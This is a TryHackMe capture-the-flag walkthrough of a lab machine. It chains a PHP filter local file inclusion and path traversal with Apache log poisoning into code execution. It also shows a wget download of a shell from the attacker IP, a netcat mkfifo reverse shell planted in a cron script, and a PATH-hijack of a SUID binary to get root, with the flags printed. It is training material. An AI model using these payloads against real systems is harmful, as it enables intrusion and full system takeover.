TryHackme

```
└─# nmap -sV -A --min-rate 5000 $ip
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)


```
found nothig i re-scan 
```
└─# sudo nmap -sS -sV -sC $ip -vv
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
In the email support contact i found : `support@mafialive.thm`
also i use `whatweb`
```
└─# whatweb $ip
http://10.10.163.188 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[support@mafialive.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.163.188], JQuery, Script, Title[Wavefire]
```
I replace the hostname on my `/etc/hosts`
` thm{f0und_th3_r1ght_h0st_n4m3} `
Now go to the domain.
found : `http://mafialive.thm/robots.txt and /test.php`
when i click on the button. i got redirect on `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`
J'ajoute le php filter: `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
I got a base64
```
┌──(root㉿1337)-[/home/bloman]
└─# base=PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==  
                                                                
┌──(root㉿1337)-[/home/bloman]
└─# echo $base | base64 -d
<?php echo 'Control is an illusion'; ?>

```
```
 </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}
```

Now bypass the LFI
```
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//..//../etc/passwd
──(root㉿1337)-[/home/bloman]
└─# echo $base | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash


```
Then Guess reading
```
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//..//../home/archangel/user.txt 
└─# base=dGhte2xmMV90MF9yYzNfMXNfdHIxY2t5fQo= 
                                                                
┌──(root㉿1337)-[/home/bloman]
└─# echo $base | base64 -d
thm{lf1_t0_rc3_1s_tr1cky}

```
From Lfi2Rce
Ressources: https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce
If the Apache or Nginx server is vulnerable to LFI inside the include function you could try to access to `/var/log/apache2/access.log` or /var/log/nginx/access.log, set inside the user agent or inside a GET parameter a php shell like `<?php system($_GET['c']); ?>` and include that files
`GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//..//../var/log/apache2/access.log `

Now i need to replace the user-agent i used it with the mozilla extensionuser-agent changer. here is what i got
```
"uid=33(www-data) gid=33(www-data) groups=33(www-data) " 10.4.26.216 - - [06/Oct/2023:21:59:55 +0530] "GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=id HTTP/1.1" 200 1689 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" 10.4.26.216 - - [06/Oct/2023:22:00:15 +0530] "GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=id HTTP/1.1" 200 1713 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
## Shell
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=wget%20http://10.4.26.216:4444/shell.php`
then launch it using php
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=php%20shell.php`

## Escalation
```
cd archangel
www-data@ubuntu:/home/archangel$ ls -la
ls -la
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt


```

I found using cronjob
```
archangel@ubuntu:~/secret$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```
```
www-data@ubuntu:/tmp$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
www-data@ubuntu:/tmp$

```
And Now just replace it 
```
$ cat /opt/helloworld.sh
#!/bin/bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.26.216 1338 >/tmp/f" >> /opt/helloworld.sh
└─# nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.4.26.216] from (UNKNOWN) [10.10.211.183] 41996
sh: 0: can't access tty; job control turned off
$ whoami
archangel
$ 
archangel@ubuntu:~/secret$ ls
ls
backup  user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

```

# From User to root
I use SUID
```
archangel@ubuntu:~/secret$ find / -type f -perm /4000 -ls 2>/dev/null
find / -type f -perm /4000 -ls 2>/dev/null
   392217     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp
   396413     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd
   393011     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn
   395021     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh
   396417     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd
   406571     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   396823    148 -rwsr-xr-x   1 root     root       149080 Sep 23  2020 /usr/bin/sudo
   392437     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   524345    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   396700     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   652899     28 -rwsr-xr-x   1 root     root          26696 Sep 17  2020 /bin/umount
   652831     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su
   652862     44 -rwsr-xr-x   1 root     root          43088 Sep 17  2020 /bin/mount
   660690     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   652934     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
  1053235     20 -rwsr-xr-x   1 root     root          16904 Nov 18  2020 /home/archangel/secret/backup
```
I see this `/home/archangel/secret/backup` and it's a Path injection
I open the backup elf file using `strings`.
I see 
`cp /home/user/archangel/myfiles/* /opt/backupfiles`

    Make a file called cp in a new directory and fill it with bash -p
    Make this file executable --> chmod +x cp
    Add the new directory to the beginning of $PATH --> export PATH="/dev/shm/random123/:$PATH"
    Execute the SUID binary --> /home/archangel/secret/backup

```
archangel@ubuntu:/tmp/Priv$ chmod +x cp
chmod +x cp
archangel@ubuntu:/tmp/Priv$ export PATH=/tmp/Priv/:$PATH
export PATH=/tmp/Priv/:$PATH
archangel@ubuntu:/tmp/Priv$ echo $PATH
echo $PATH
/tmp/Priv/:/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:/tmp/Priv$ /home/archangel/secret/backup
/home/archangel/secret/backup
root@ubuntu:/tmp/Priv#
root@ubuntu:/tmp/Priv# whoami
whoami
root
root@ubuntu:/tmp/Priv# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root* 
cat root*
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}

```